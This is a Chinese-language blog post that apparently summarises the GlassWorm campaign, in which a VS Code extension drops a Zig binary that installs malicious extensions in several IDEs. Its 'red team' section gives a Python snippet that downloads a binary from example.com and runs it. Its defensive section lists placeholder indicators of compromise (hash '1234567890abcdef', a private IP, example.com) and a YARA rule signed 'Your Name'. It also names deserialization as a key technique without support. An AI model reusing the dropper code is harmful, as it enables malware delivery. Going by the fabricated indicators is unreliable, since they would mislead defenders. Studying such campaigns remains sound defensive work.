---
layout: post
title:  "GlassWorm Campaign Uses Zig Dropper to Infect Multiple Developer IDEs"
date:   2026-04-10 18:42:07 +0000
categories: [security]
severity: critical
---

# 🚨 解析 GlassWorm 攻擊：利用 Zig Dropper 瞄準整合開發環境

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `Zig`, `Native Binary`, `VS Code Extensions`, `Deserialization`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: GlassWorm 攻擊利用了一個名為 "specstudio.code-wakatime-activity-tracker" 的 VS Code 擴充套件，該套件會下載並執行一個 Zig 編譯的 native binary，從而實現 RCE。
* **攻擊流程圖解**:
  1. 使用者安裝 "specstudio.code-wakatime-activity-tracker" 擴充套件。
  2. 擴充套件下載並執行 Zig 編譯的 native binary。
  3. Native binary 掃描系統中的所有 IDE，包括 VS Code、VSCodium、Positron 等。
  4. Native binary 下載並安裝一個惡意的 VS Code 擴充套件 "floktokbok.autoimport"。
  5. 惡意擴充套件實現 RCE，從而導致敏感數據泄露和遠程訪問木馬的安裝。
* **受影響元件**: VS Code、VSCodium、Positron 等 IDE，以及使用 "specstudio.code-wakatime-activity-tracker" 和 "floktokbok.autoimport" 擴充套件的使用者。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 使用者需要安裝 "specstudio.code-wakatime-activity-tracker" 擴充套件。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 下載 Zig 編譯的 native binary
    binary_url = "https://example.com/win.node"
    response = requests.get(binary_url)
    with open("win.node", "wb") as f:
        f.write(response.content)
    
    # 執行 native binary
    import subprocess
    subprocess.run(["win.node"])
    
    ```
* **繞過技術**: 攻擊者可以使用各種技術來繞過安全防護，例如使用加密的 payload、利用零日漏洞等。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | C:\Users\username\AppData\Local\Temp\win.node |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule GlassWorm_Detection {
        meta:
            description = "Detects GlassWorm malware"
            author = "Your Name"
        strings:
            $a = "win.node"
            $b = "floktokbok.autoimport"
        condition:
            $a and $b
    }
    
    ```
* **緩解措施**: 使用者應立即卸載 "specstudio.code-wakatime-activity-tracker" 和 "floktokbok.autoimport" 擴充套件，並更新 VS Code 和相關 IDE 至最新版本。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Zig**: 一種編程語言，設計用於構建高性能、安全的應用程序。Zig 編譯器可以生成 native binary，從而實現跨平台的兼容性。
* **Native Binary**: 一種可以直接在操作系統上執行的二進制文件，不需要任何額外的解釋器或虛擬機。
* **Deserialization**: 將數據從序列化的形式恢復到原始的數據結構。Deserialization 可以用於攻擊，例如實現 RCE。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/04/glassworm-campaign-uses-zig-dropper-to.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


